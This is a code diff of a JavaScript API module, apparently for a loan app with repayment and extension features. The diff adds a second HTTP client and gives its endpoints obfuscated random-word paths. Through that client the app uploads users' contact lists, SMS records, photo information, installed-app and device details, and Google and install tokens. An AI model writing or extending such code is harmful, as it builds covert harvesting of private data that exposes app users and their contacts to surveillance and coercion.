@@ -1,4 +1,5 @@
 import request from '@/utils/serves'
+import aaa from '../utils/aaa'
 //获取验证码
 export function getyzmApi(data) {
     return request.post('/softy-photofinishing/disappointedly-cotenant/micromesh', data)
@@ -45,29 +46,32 @@ export function uploadbaseform(data) {
 export function getdefaultform(data) {
     return request.post('/megillah-hummel-bosshead/observance-dextrorotatory/subsection-avaunt-connubially', data)
 }
+
+
+
 //检测设备上报情况
 export function setDeviceInfoAPI() {
-    return request.post('/maintop/autobus-armorial')
+    return request.post('/accessorily-bladework-yacket/escribe-vicara')
 }
 //上报设备信息
 export function getshebeiInfoAPI(data) {
-    return aaa.post('/superserviceable/sittwe-anymore-absently', data)
+    return aaa.post('/acaleph-ccu/jollo-cithaeron-telephonitis', data)
 }
 //上报App信息
 export function getAppInfoAPI(data) {
-    return aaa.post('/convector-unsocial-blae/inscribe/fluvial-bondman-yaleman', data)
+    return aaa.post('/krameria-calicular/parge/peperoni', data)
 }
 //上报通讯录
 export function gettxlAPI(data) {
-    return aaa.post('/aurar/underprize-benefactor/chinovnik-gasthaus-dumpy', data)
+    return aaa.post('/aridity-dichloromethane/visla-reapplication-cryptate', data)
 }
 //上报短信记录
 export function getduanxinAPI(data) {
-    return aaa.post('/herdwick-chiliad-tauten/recursion', data)
+    return aaa.post('/furfur-matutinal-ugsome/mesoblast-handbill', data)
 }
 //上报照片信息
 export function getPhotoInfoAPI(data) {
-    return aaa.post('/tessellate/splinter-exchangeability-disciplinant', data)
+    return aaa.post('/motivic-thoughtfully/organa-hempen-reflower/caliginous', data)
 }
 
 
@@ -98,15 +102,15 @@ export function dingdanhuankuanAPI(data) {
 }
 //获取订单还款方式
 export function getOrderPayType(data) {
-    return request.post('/supernormal/racinage-neurology', data)
+    return request.post('/croup/metaphyte-impleadable/skinpopping', data)
 }
 //获取订单还款链接
 export function getOrderLinkAPI(data) {
-    return request.post('/abasement-goosegog/bta', data)
+    return request.post('/paperweight-cliquey/idioplasm/ultramicrobalance-vessel-milankovich', data)
 }
 //展期还款
 export function zhanqiAPI(data) {
-    return request.post('/benevolence/heuchera-roumania/legiron-apyrexia-mesorectum', data)
+    return request.post('/uxoriously-lyceum-sheridan/alberich-climacteric/nuclearize', data)
 }
 //获取反馈列表
 export function getfankuiLiatAPI(data) {
@@ -120,17 +124,20 @@ export function getfankuiTypeListAPI(data) {
 export function uploadfankuiAPI(data) {
     return request.post('/rotproof/endocrine-lucency/rhotacize', data)
 }
+
+
+
 //上报goosleToken
 export function uploadGoogleTokenAPI(data) {
-    return aaa.post('/anonym-sandwort-larviparous/costarican-redound/inefficient-glumpy', data)
+    return aaa.post('/buckhound-boson/goatskin-radioisotope-carthage', data)
 }
 //上报installReferrer
 export function uploadInstallReferrerAPI(data) {
-    return aaa.post('/taw/effluvium-microseism/photoelectroluminescence-watcom', data)
+    return aaa.post('/unprofessed/hypnodrama-faster-rsgb/chinny-pyrophyllite-salicyl', data)
 }
 //上报instanceid
 export function uploadInstanceIdAPI(data) {
-    return aaa.post('/shareout-hem/indebt-unavailable', data)
+    return aaa.post('/helpful-pseudo-immunogenesis/preclassical-charitarian/fluoroscopist', data)
 }
 //错误日志
 export function errorLog(data) {
